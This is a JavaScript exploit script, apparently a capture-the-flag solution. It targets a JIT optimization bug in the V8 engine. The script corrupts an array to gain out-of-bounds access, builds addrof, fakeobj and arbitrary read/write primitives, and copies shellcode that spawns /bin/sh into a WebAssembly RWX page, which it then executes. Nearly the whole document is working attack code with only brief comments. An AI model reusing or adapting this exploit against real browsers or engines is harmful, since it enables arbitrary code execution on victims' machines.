/// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

var wasm_bytecode = new Uint8Array([0,97,115,109,1,0,0,0,1,18,4,96,0,0,96,2,127,127,1,127,96,1,127,0,96,0,1,127,3,5,4,0,1,2,3,4,5,1,112,1,2,2,5,6,1,1,130,2,130,2,6,8,1,127,1,65,128,136,4,11,7,117,6,6,109,101,109,111,114,121,2,0,3,97,100,100,0,1,25,95,95,105,110,100,105,114,101,99,116,95,102,117,110,99,116,105,111,110,95,116,97,98,108,101,1,0,11,95,105,110,105,116,105,97,108,105,122,101,0,0,25,95,101,109,115,99,114,105,112,116,101,110,95,115,116,97,99,107,95,114,101,115,116,111,114,101,0,2,28,101,109,115,99,114,105,112,116,101,110,95,115,116,97,99,107,95,103,101,116,95,99,117,114,114,101,110,116,0,3,9,7,1,0,65,1,11,1,0,10,25,4,3,0,1,11,7,0,32,0,32,1,106,11,6,0,32,0,36,0,11,4,0,35,0,11]);
var wasm_mod = new WebAssembly.Module(wasm_bytecode);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
let arr_buf = new ArrayBuffer(0x100);

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function ftoi_hex(val) {
    return "0x" + ftoi(val).toString(16);
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

function hot(x) {
    let a = -0;
    let b = -0x80000000;

    if (x) {
        a = -1;
        b = 1;
    }
    let aux = ((a - b) + 0);
    let p = Math.max(aux, -0x7fffffff);
    p = -p;
    p >>= 29;
    let primer_arr = new Array(p);
    primer_arr.shift();
    let oob_arr = [1.1];
    return [primer_arr, oob_arr];
}

%PrepareFunctionForOptimization(hot);
hot(true);
%OptimizeFunctionOnNextCall(hot);

// oob_arr offsets: 20 -> float_arr_map
//                  27 -> obj_arr_map

let [primer_arr, oob_arr] = hot(false);
let float_arr = [1.1, 2.2, 3.3, 4.4];
let obj_arr = [{}];

console.log("Got array of length: " + primer_arr.length);

// set oob_arr length to 6969 using primer_arr[14]
primer_arr[14] = 6969;

let float_arr_map = ftoi(oob_arr[20]);
let obj_arr_map = ftoi(oob_arr[27]);

console.log("[*] float_arr_map: 0x" + float_arr_map.toString(16));
console.log("[*] obj_arr_map: 0x" + obj_arr_map.toString(16));

function addrof(obj) {
    obj_arr[0] = obj;
    oob_arr[27] = itof(float_arr_map);
    let addr = ftoi(obj_arr[0]);
    oob_arr[27] = itof(obj_arr_map);
    return addr & 0xffffffffn;
}
console.log("[*] obj_arr addr(testing addrof): 0x" + addrof(obj_arr).toString(16));

function fakeobj(addr) {
    float_arr[0] = itof(addr);
    oob_arr[20] = itof(obj_arr_map);
    let obj = float_arr[0];
    oob_arr[20] = itof(float_arr_map);
    return obj;
}

let arb_rw_arr = [itof(float_arr_map), 2.2, 3.3, 4.4];
function arbread(addr) {
    let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);
    arb_rw_arr[1] = itof((2n << 32n) + addr - 0x8n);
    return ftoi(fake[0]);
}

function arbwrite(addr, val) {
    let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);
    arb_rw_arr[1] = itof((2n << 32n) + addr - 0x8n);
    fake[0] = itof(val);
}

var shellcode = [144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,106,104,72,184,47,98,105,110,47,47,47,115,80,72,137,231,104,114,105,1,1,129,52,36,1,1,1,1,49,246,86,106,8,94,72,1,230,86,72,137,230,49,210,106,59,88,15,5,];
let rwx_page = arbread(addrof(wasm_instance) + 0x68n);
console.log("[*] rwx_page: 0x" + rwx_page.toString(16));
// overwrite backing store of array buffer to point to rwx_page
arbwrite(addrof(arr_buf) + 0x14n, rwx_page);
let dataview = new DataView(arr_buf);

for (let i = 0; i < shellcode.length; i++) {
    dataview.setUint8(i, shellcode[i], true);
}

let pwn = wasm_instance.exports.add;
pwn();
